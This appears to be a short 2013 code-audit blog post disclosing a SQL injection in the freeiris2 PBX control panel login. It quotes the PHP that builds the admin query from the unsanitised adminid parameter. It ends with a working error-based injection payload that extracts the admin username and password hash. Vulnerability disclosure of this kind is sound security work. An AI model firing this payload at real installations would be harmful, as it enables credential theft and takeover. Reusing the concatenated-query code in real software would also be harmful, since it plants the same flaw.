title: "freeiris2 SQL Injection"
date: 2013-06-09 23:29:24
tags:
id: 216
comment: false
categories:
  - 代码审计
---

<pre class="brush:php">官网：http://www.freeiris.org

....cpanel/index.php
function do_login() {
	global $rpcpbx;
	global $smarty;
	global $friconf;

	//忘记填写参数
	if (trim($_REQUEST['adminid']) == "")
		error_popbox(103,null,null,null,null,'submit_failed');
	if (trim($_REQUEST['passwd']) == "")
		error_popbox(103,null,null,null,null,'submit_failed');

	//发送请求验证login
	$rpcres = sendrequest($rpcpbx-&gt;base_clientlogin($_REQUEST['adminid'],md5($_REQUEST['passwd'])),1);

	//成功(不会在这里出现失败)
	session_cache_expire($friconf['session_expiry']);
	session_start();
	$_SESSION["admin"] = true;
	$_SESSION["res_admin"] = $rpcres['res_admin'];

	//回调地址
	if (trim($_REQUEST['callback']) != "") {
		error_popbox(null,null,null,null,$_REQUEST['callback'],'submit_successfuly');
	} else {
		error_popbox(null,null,null,null,'main.php','submit_successfuly');
	}

	exit;
}

......rpcpbx.php
function base_clientlogin($adminid,$passwd)
{
	global $freeiris_conf;
	global $dbcon;

	//判断用户帐户
	$result=mysql_query("select * from admin where adminid = '$adminid' and passwd = '$passwd'",$dbcon); //adminid直接进去了。
	if (!$result)
		return(rpcreturn(500,mysql_error(),100,null));
	$queryres = mysql_fetch_array($result);
	mysql_free_result($result);

	//如果不存在
	if (!$queryres) {
		return(rpcreturn(401,'authorization failed',102,null));
	} else {
		//为这个远程呼叫产生session
		session_start();
		$_SESSION["client_authorized"] = true;

		return(rpcreturn(200,null,null,array('res_admin'=&gt;$queryres)));
	}

	return($result);
}

EXP

adminid=1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((select adminid from admin limit 0,1),0x7c,(select passwd from admin limit 0,1),0x7c,FLOOR(RAND(0)*2))x from  information_schema.tables GROUP BY x)a) AND '1'='1</pre>